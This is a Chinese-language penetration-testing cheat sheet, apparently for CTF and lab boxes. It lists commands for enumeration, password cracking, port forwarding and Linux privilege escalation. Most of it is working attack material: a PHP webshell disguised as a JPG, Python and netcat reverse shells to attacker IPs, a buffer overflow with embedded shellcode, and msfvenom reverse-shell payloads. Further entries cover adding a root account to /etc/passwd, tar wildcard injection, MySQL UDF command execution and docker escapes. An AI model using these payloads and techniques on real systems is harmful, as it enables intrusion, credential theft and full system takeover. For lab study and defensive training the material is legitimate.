**8433**：GraphQL 端口，可能会有/graphql端点

**31337**：`nc ip 31337`登陆

**65534**：ftp登陆端口，使用时使用`-p 65534`参数

### 6. 工具利用

1. **Weevely工具**：

`weevely generate <password>  <path>/xx.php`

`weevely  <url>  <password>`（上面是生成，下面是在网页中使用）

2.  **网络设置**`/etc/init.d/networking restart`

3.  **exiftool工具**，用于读取、写入和编辑图像、音频和视频文件中的元数据）`exiftool shell.Jpg或者steghide extract -sf trytofind.jpg`，输入密码查看

4. **crunch工具**

```bash

crunch 13 13 -t 'bev,%%@@^1995'>pass.txt

13 13输入最长和最短密码长度

-t 'bev,%%@@^1995'

定义密码的模板模式：

• bev,：固定字符，直接出现在密码开头。

• %%：占位符，表示2位数字（% 默认代表数字 0-9）。

• @@：占位符，表示2位小写字母（@ 默认代表小写字母 a-z）。

• ^：占位符，表示1位大写字母（^ 默认代表大写字母 A-Z）。

• 1995：固定字符，直接出现在密码末尾。

```

5. **john**爆破使用`—wordlist=pass`使用pass爆破密码，如果一个文件不知道怎么使用john破解，使用`locate *2john`查看

如果unzip不行就用这个`7z x sitebackup3.zip`

6. **fcrackzip**

作用同上  `fcrackzip -v -D -p passwd.txt -u t0msp4ssw0rdz.zip`

7. 带**盐值的MD5**解密使用密文\$盐值形式

  `john -form=dynamic_6 pass.txt解密`

8. ` gobuster dir -u http://192.168.4.144:8008/NickIzL33t/ -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36" -w /root/wordlist/rockyou.txt -x html`

9. 发现users.db文件，可以使用`nc -nvlp 6666 > users.db`和`nc 10.10.11.16 6666 < /aa/ad/users.db`进行传送,使用sqlite3 users.db进行查看。

10. `socat TCP-LISTEN:8081，resueaddr,fork TCP:127.0.0.1:8080`**端口转发**，即访问8081就是访问8080

11. **命令劫持**，如下步骤

```bash

https://www.cnblogs.com/siqi/p/3604354.html

echo $PATH

echo “/bin/bash”>/tmp/ls

export PATH=/tmp:$PATH

echo $PATH

chmod 777 /tmp/ls

查看地址

https://www.freebuf.com/articles/system/173903.html

```

12. **php伪协议**

```bash

php://filter/read=convert.base64-encode/resource=config

php://filter/read=convert.base64-encode/resource=upload

php://filter/read=convert.base64-encode/resource=login

php://filter/read=convert.base64-encode/resource=index

php://filter/read=convert.base64-encode/resource=home

------------------------------------------------------

php://filter/convert.base64-encode/resource=config

php://filter/convert.base64-encode/resource=upload

php://filter/convert.base64-encode/resource=login

php://filter/convert.base64-encode/resource=index

php://filter/convert.base64-encode/resource=home

# 后面的自己多想想

# 用php伪协议反弹shell的时候比如用zip：//反弹最后文件名不要加上.php，系统会帮我们加上

```

13. **mysql登陆**

`mysql --ssl=0 -h 192.168.106.144  -uroot -pH4u%QJ_H99`

14. **mysql更改密码**

`Update drupaldb.users set pass="" where name="";`

`update wp_users set user_pass=md5('admin') where user_login='admin';`

`update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'chang3m3'))) where username = 'cmsmsadmin'`

15. `enum4linux -a -o ip`枚举

16. `smbclient //ip/或smbclient -L ip`连接或使用`smbclient //ip/ --user user`名连接  

17. `hashcat 1.txt /usr/share/wordlists/rockyou.txt`密码寻找  

18. `john shadow_file --format=crypt`主要的破解大方法    

19. **sslscan**扫描  

20. `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ab.zip`

21. `ffuf -u 'http://linkvortex.htb' -H 'host:FUZZ.linkvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 230 -t 100>fuzz1.txt`

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949`

`cat fuzz1.txt|grep -v "Progress"`

使用**fuff**爆破域名

22. 如果有.git目录，使用**git-dumper**`git-dumper http://dev.linkvortex.htb/.git website/`下载  

如果有HEAD文件，使用`git diff-tree -p HEAD`读取信息

在有.git的目录中使用`git log`寻找信息，`git show`会出现commit，使用`git checkout + commit后面的信息`即可挖掘信息

同上

23. `echo -n a235561351813137123456 | md5sum`

生成盐值为 `a235561351813137`的`123456`的密文md5    

24. `redis-cli -h 192.168.156.69`查看redis的信息，输入info查看信息    

25. **sqlmap**使用`--os-shell`参数实现内部shell

26. **401嗅探**，即弹出输入账号密码

```

Admin/admin

Admin/123456

Admin/password

Admin/secret

```

27. 检查gcc版本，与内核提权挂钩

28. py文件使用**python**，pl文件用**perl**，rb文件用**ruby**

29. rbash逃逸

```bash

echo $PATH #输出路径

ls bin #查看可以使用的命令而逃逸

# 使用vi逃逸

vi

:set shell=/bin/bash

:shell

```

30. 在有.git的目录中使用`git log`寻找信息，`git show`会出现commit，使用`git checkout + commit后面的信息`即可挖掘信息

31. 弱口令`admin/password`

32.

```bash

curl -X POST http://192.168.56.101:33414

# 使用POST上传

curl -F file=@test.txt http://192.168.56.101:33414/file-upload

curl -F filename="up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload

curl -F filename="/tmp/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload

# 如果成功，会出现{"message":"File successfully uploaded /tmp/up.txt"}，即将test.txt传为up.txt

curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://192.168.56.101:33414/file-upload

# 上传密钥

# 如果无法上传，可以将.pub文件改为.txt文件在上传

```

33. node.js利用

```bash

curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq

curl -s -G 'http://10.129.250.155:3000/graphql' --data-urlencode 'query={user {username, password} }'|jq

# 可能存在graphql注入，试一下

```

34. `tar -cvzf shell.tar.gz shell/`打包shell目录下的所有东西

35. jpg文件反弹shell

```bash

echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg

echo '<?=`$_GET[0]`?>' >> webshell.php.jpg

# 制作完成后上传，然后访问反弹shell

http://10.10.10.185/images/uploads/webshell.php.jpg?0=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",8833));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# 下面是url编码

http://10.129.249.35/images/uploads/webshell.php.jpg?0=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.28%22,8833));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

```

36. chisel工具

```bash

# 当靶机有sql文件但是没有mysql，可以使用chisel传到kali里面使用

cd linuxtool

PS: wget http://10.10.14.7:8080/chisel_1.11.3_linux_amd64

kali: ./chisel_1.11.3_linux_amd64 server -p 8000 -reverse

PS: ./chisel_1.11.3_linux_amd64 client 10.10.14.7:8000 R:3306:127.0.0.1:3306 &

# 这里要注意使用自己的ip

# 无法访问内部端口，使用chisel工具访问

cd linuxtool

kali: ./chisel_1.11.3_linux_amd64 server -p 80 --reverse

kali: setsid ./chisel_1.11.3_linux_amd64 client 192.168.45.189:80 R:9001:127.0.0.1:9001 </dev/null >/dev/null 2>&1 &

# 自己的ip

PS: sudo /usr/local/bin/cassandra-web --bind 0.0.0.0:9001 -u cassie -p SecondBiteTheApple330

# 此时我们运行文件就不会收到影响，此处都可以

```

37. 图片隐写

```bash

stegseek haclabs.jpeg

steghide extract -sf new.jpg

# 后续输入密码

```

38. 常见目录遍历文件

```bash

/var/www/html/config.php

/var/www/config.php

/etc/apache2/apache2.conf

/proc/self/cwd/config.php

/proc/self/cwd/database.db

/proc/self/cwd/utils/db.py

```

### 7.  内网收集

1.  `find / -perm -4000 -type f 2>/dev/null`，收集suid文件,看到suid文件如果不知道干什么，去网上查也没有信息，使用`strings 文件`的方式查看是否有信息

2.  `find / -perm -777 -type f 2>/dev/null`，收集可执行文件

3.  `Uname -a` 和 `lsb_release -a`内核信息,内核提权

4.  `Cat /etc/crontab`和`cat /etc/cron*`和`ps aux`查

5.  看定时任务

6.  `find / -writable 2>/dev/null`查找可以写入的文件

7.  `Sudo -l`，如果不是root执行sudo权限，使用sudo -u name + 后续

出现自己写sudo文本，记得`chmod 777 文件名`

8.  `Cd /home`

9.  如果可以`cat /home/*/.bash_history`

10. 敏感文件**login.php**和**wp-login.php**

在/var/www或`/var/www/html`之下

11. 多用户管理面板，并且有任意代码执行漏洞

即`SHADOWSOCKS-LIBEV`命令执行漏洞

`https://nosec.org/home/detail/1589.html`

（temple of doom）

12. 敏感目录`/usr/local/bin`

13. 敏感文件`backup.Sh`和`backups.sh`

（pinky-palace-2）

14. **newgrp**更改组

15. `find / -writable ! -path '/run/*' ! -path '/lib/*' ! -path '/sys/*' ! -path '/proc/*' ! -path '/dev/*' 2>/dev/null`

命令解释：

分别用于排除 /run、/lib、/sys、/proc 和 /dev 目录及其子目录下的文件和目录。

16. 如果无法使用wget下载文件，使用nc下载

```bash

靶机：nc ip port < exp

Kali：nc -nvlp port > exp

```

17. `find / -user admin 2>/dev/null`查看当前用户可以使用的文件

18. nc连接时如果没有反应可以尝试`busybox nc`

19. nc也无法下载，使用base64，

```bash

靶机：Base64 agent

Kali：cat 1.txt|base64 -d > agent

```

20. 在执行pspy64脚本时，因为无法停止，使用命令`timeout 2m ./pspy64`可以限定执行时间，防止没有定时任务而浪费时间可能

21. which命令寻找\$PATH中文件位置，whereis寻找文件执行的位置，返回更全面

22. 输入id看自己是那个组的，然后输入`find / -group mlocate 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'`,这里的mlocate改为自己的组

23. `ln -sf /home/m.sander/personal/creds-for-2022.txt fk_this_box`创建符号连接，后续访问fk\_this\_box即为/home/m.sander/personal/creds-for-2022.txt。

24. `ss -ntplu`查看端口

### 8. 权限提升

**python3 -c 'import pty;pty.spawn("/bin/bash")'**

1. `sudo -l`查看是否可以提权

2. `searchsploit`提权

3. 查看敏感文件提权

```bash

Find / -perm -4000 -type f 2>/dev/null  # 寻找suid文件

Find / -perm -777 -type f 2>/dev/null # 寻找可读可写可执行文件

getcap -r / 2>/dev/null

# 寻找Capabilities文件，即索具有特殊权限（capabilities）的文件

Newgrp   # 换组

find / -perm -u=s 2>/dev/null|grep -v '/proc\|^/run\|^/sys\|^/snap'

# grep -v过滤掉 /proc、/run、/sys、/snap 等虚拟文件系统或动态生成的目录，可以避免这些目录中的临或伪文件干扰结果。

```

4. `ssh -L 9898:localhost:9898 gael@10.10.11.74 -fN` **ssh本地端口转发**。（artifical）

`ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187`**内部端口转发**，一个是在kali，一个是在靶机

5. `ltrace ./agent`也是**缓冲区溢出**的一种方法

**gdb调试如下**

```bash

disas main # 查看是否有可能溢出的函数

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# 生成200个字符

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41366641

# 查看偏移量，这里是上面的eip偏移量,-l后面的是上面的字符长度

# 输出的数字就是溢出长度，比如输出524，那么后面四个字节就是eip

gdb-peda: run $(python -c 'print ("A" * 268 + "B" * 4)')

# gdb-peda进行调试，524是前面的溢出，B是覆盖eip，后面测试esp

info r

# 获取esp地址

# 常见坏字符: \x00（NULL 字节） \x0a（换行符，\n） \x09（水平制表符，\t） \x20（空格字符）

------------------------------------------------------------------------------------

msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc

# 生成payload，

./r00t $(python -c 'print ("A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\xba\xa0\x03\xb5\x23\xda\xc8\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x11\x03\x56\x11\xe2\x55\x69\xbe\x7b\x0c\x3c\xa6\x13\x03\xa2\xaf\x03\x33\x0b\xc3\xa3\xc3\x3b\x0c\x56\xaa\xd5\xdb\x75\x7e\xc2\xd4\x79\x7e\x12\xca\x1b\x17\x7c\x3b\xaf\x8f\x80\x14\x1c\xc6\x60\x57\x22")')

--------------------------------------------------------------------------------------

反向ESP应该是\x60\xfb\xff\xbf

访问https://shell-storm.org/shellcode/files/shellcode-902.html

# 复制shellcode

./r00t $(python -c 'print "A"*268 + "\x50\xfb\xff\xbf" + "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

# 这里A个数是你之前的eip地址，后面的时esp地址，\0x90看情况10-100大概都行，最后的是链接内的shellcode

```

![alt text](image-6.png)

**gdb本地链接调试**

```bash

# （set follow-fork-mode child）

# （set detach-on-fork off） 看情况使用

# 如果缓冲区溢出是本地的开放端口，那么可以这样调试

gdb-peda panel

gdb-peda$ run #先将程序开启

python3 -c 'print("A"*500)'|nc localhost 31337

# 这里要看开放的是什么端口在开始，此时我们发现一个溢出出现了

gdb-peda$ disassemble handlecmd # 拆解函数，但是要先停下进程

gdb-peda$ b *handlecmd+70  #打断点，这里的70是最大的不会溢出的量

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# 这里的大小根据你的需求定

echo 'asd'|nc localhost 31337 # 这里的是生成的字符串

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q d7Ad

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q Ae0A

# 根据生成的RSP,RBP进行解读

jmpcall # 寻找rsp地址，在call rsp

# rsp地址0x400cfb

msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.71.128 lport=7777 -b '\x00\x0a\x0b' -f python

# 生成shellcode

# 将生成的shellcode替换到huan.py,同时将rsp地址替换到rsp中，rsp地址0x400cfb是小端格式，脚本中为：\xfb\x0c\x40\x00\x00\x00

```

![alt text](image-7.png)

6. 进行横向移动时，用户名可能就是密码，同时`wordpress`的`wp-config`也可能是密码。

7. **/etc/passwd**可写,使用openssl

```bash

# openssl passwd toor

openssl passwd -1 -salt salt toor

echo 'root2:$1$salt$ypVp6/eHPZfPAq6Ldo82h0:0:0:root:/root:/bin/bash' >> /etc/passwd

su root2

toor

```

8. linux重要文件大多数保存在`/etc`目录下，查找文件时可以优先查看。

9. 缓冲区溢出提权（**pg的 Blackgate**）

10. rpc提权，查看文件是否含有rpc文件，RPC 服务器的 RPC 协议。Google搜索`python rpcpy exploit`，也可以使用Linux路径下的rpcpy-exploit.py，下载到靶机上python3运行

11. `pkill -9 panel;pkill -i panel`删除进程

**在获得root权限后，一定要建立.ssh文件密钥可以直接登陆防止shell不合规**

12. `find / -name "conf*" 2>/dev/null|grep -v sys|grep -v var|grep -v etc|grep -v usr`对于conf文件一定要找

hackthebox用http-proxy

pg用socks-proxy

ifconfig tun0 mtu 1000

### 重启网络方法

```bash

以管理员身份运行命令提示符：

cmd

# 停止 VMware 服务

net stop "VMware NAT Service"

net stop "VMware DHCP Service"

# 启动 VMware 服务  

net start "VMware DHCP Service"

net start "VMware NAT Service"

3. 在虚拟机内重置网络

bash

# 完全清理网络配置

sudo systemctl stop NetworkManager

sudo pkill dhclient

sudo ip addr flush dev eth0

sudo ip link set eth0 down

sudo ip link set eth0 up

  

# 重启 NetworkManager

sudo systemctl start NetworkManager

sleep 3

  

# 现在尝试获取 IP

sudo dhclient -v eth0

```

### 磁盘组提权方法

```bash

id

uid=1000(dora) gid=1000(dora)groups=1000(dora),6(disk)

# 有6可以看到属于磁盘组

df -h

Filesystem                         Size  Used Avail Use% Mounted on

/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /

udev                               947M     0  947M   0% /dev

tmpfs                              992M     0  992M   0% /dev/shm

tmpfs                              199M  1.2M  198M   1% /run

tmpfs                              5.0M     0  5.0M   0% /run/lock

tmpfs                              992M     0  992M   0% /sys/fs/cgroup

/dev/loop0                          62M   62M     0 100% /snap/core20/1611

/dev/loop4                          68M   68M     0 100% /snap/lxd/22753

/dev/loop2                          50M   50M     0 100% /snap/snapd/18596

/dev/loop3                          92M   92M     0 100% /snap/lxd/24061

/dev/loop1                          64M   64M     0 100% /snap/core20/1852

/dev/sda2                          1.7G  209M  1.4G  13% /boot

tmpfs                              199M     0  199M   0% /run/user/1000

debugfs /dev/mapper/ubuntu--vg-ubuntu--lv

cat /root/.ssh/id_rsa

# 先查看有没有密钥，在查看密码

cat /etc/shadow

```

### docker定时任务提权

```bash

id

uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)

# 出现docker即可提权

docker images # 查看是否可以提权

#REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE

#privesc             latest              09ae39f0f8fc        5 years ago         88.3MB

#<none>              <none>              e13ad046d435        5 years ago         88.3MB

#alpine              latest              a24bb4013296        5 years ago         5.57MB

#debian              wheezy              10fcec6d95c4        7 years ago         88.3MB

# 类似的信息出现，寻找TAG显示latest

docker run -v /:/mnt --rm -it redmine chroot /mnt bash

# redmine处替代为上面的TAG显示latest的即可

```

### .conf文件提权

在可以写入的定时任务的.conf文件中寻找**actionban**模块写入`actionban = chmod +s /bin/bash`，后续使用`bash -p`触发提权

在平常如果可以触发`chmod +s /bin/bash`，后续也可以使用`bash -p`提权

### .so文件提权

`gcc -shared -o /home/ted/.lib/libsecurity.so -fPIC ./exp.c`,上传提权.c文件

### tar提权 1 sudo

```bash

sudo -l

(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *

# 出现这个提权方法

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.195 80 >/tmp/f

# privesc.sh，建立脚本

┌──(kali㉿kali)-[~/pgplay]

└─$ rlwrap -cAr nc -nvlp80

# 开启监听

james@blaze:~$ echo  "" > '--checkpoint=1'

james@blaze:~$ echo  "" > '--checkpoint-action=exec=sh privesc.sh'

james@blaze:~$ wget 192.168.45.195:8000/privesc.sh

james@blaze:~$ chmod +x privesc.sh

james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

```

### tar提权 2 crontab

```bash

cd /home/alfredo/restapi

tar czf /tmp/flask.tar.gz *

# 出现这种可以提权

echo '#!/bin/bash' >> getroot.sh

echo 'cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys' >> getroot.sh

touch ./--checkpoint=1 ./--checkpoint-action=exec=getroot.sh

# 需要找到位置

```

### SPX提权

```bash

# 在网页端如果发现PHPinfo，中含有spx，大概有漏洞，可以根据版本号查看

curl 'http://192.168.0.172/phpinfo.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=/../../../../../../../../etc/passwd'

# 进行一个目录遍历漏洞，使用spx_key和spx_ui_uri查看，这里的spx_key是spx.http_key

```

### Jenkins提权部分方法

```bash

# 如果知道密码所在地比如/root/.jenkins/secrets/initialAdminPassword

wget http://localhost:8080/jnlpJars/jenkins-cli.jar

# 下载文件 jenkins-cli.jar

java -jar jenkins-cli.jar -s http://localhost:8080 -http help 1 "@//root/.jenkins/secrets/initialAdminPassword"

# 可以找到密码

----------------------------------------------------------------------------------------------

# linuxtool下的jekins.py可使用

python jekins.py -u http://127.0.0.1:8080

# 文件遍历

```

### mysql提权

```bash

kali: gcc -g -c 1518.c -o raptor_udf2.o -fPIC

kali: gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 先编译文件

mysql: use mysql;

mysql: create table foo(line blob);

mysql: insert into foo values(load_file('<path to UDF file>'));

# 这里是你的文件的位置

mysql: show variables like '%plugin%';

# 寻找plugin的位置下面用

mysql: select * from foo into dumpfile '/usr/lib/mysql/plugin/udf_file_name.so';

mysql: create function do_system returns integer soname 'udf_file_name.so';

mysql: select do_system('chmod +s /bin/bash');

# 这里可以执行其他命令

```

### Makefile提权

使用linuxtool下的Makefile，上传上去触发即可，注意makefile缩进需要用tab键而不是空格
